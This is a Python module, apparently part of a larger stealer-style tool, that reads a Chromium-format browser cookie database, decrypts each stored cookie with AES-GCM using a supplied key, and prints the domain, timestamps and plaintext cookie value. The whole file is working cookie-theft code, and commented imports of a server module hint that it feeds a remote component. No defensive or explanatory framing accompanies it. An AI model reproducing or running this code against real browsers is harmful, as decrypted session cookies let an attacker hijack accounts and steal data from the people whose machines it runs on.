from CryptoAc.Symmetric.AEScrypto import AES
from Design.des import Color,colorama
import sqlite3
import datetime



# from main import Server,os
# from tempfile import gettempdir

class WebCookies(object):
    
    def _decrypt_password(self,key,iv,en_pass):
        try:
            return self.decryptgcm(key,iv,en_pass)[:-16].decode()
        except Exception as e:
            return 'null'

    def decryptgcm(self,key,iv,data):
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)

    def extractTime(self,microTime):
        return str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=microTime))

    def show(self,path,key,collor=False):
        if collor:res,l,r,g,rs = str(),Color().lYellow,Color().lRed,Color().lgreen,colorama.Style.RESET_ALL
        else:res,l,r,g,rs = str(),str(),str(),str(),str()
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("""SELECT host_key,
                    value, 
                    creation_utc, 
                    last_access_utc, 
                    expires_utc, 
                    encrypted_value 
            FROM cookies """)
            for n in cursor.fetchall()[::-1]:
                try:
                    domain,value,creat,last,expires,enc = n
                    if not value: passwd = self._decrypt_password(key,enc[3:15],enc[15:])
                    else: passwd=value
                    if domain[0] == '.': domain = domain[1:]
                    last,creat,expires = self.extractTime(last),self.extractTime(creat),self.extractTime(expires)
                    if not passwd: continue
                    res += f"{l+'Domain':<20}{g}{domain}{rs}\n{l+'Created':<20}{g+creat+rs}\n"
                    res += f"{l+'Last used':<20}{g+last+rs}\n{l+'Expires':<20}{g+expires+rs}\n"
                    res += f"{l+'Decrypted cookie':<20}{r+passwd}\n{l+'-'*30}{rs}\n\n"
                    res += rs
                except Exception as e:
                    pass
        except Exception as e: 
            pass
        try:
            cursor.close()
            conn.close()
        except:pass
        return res
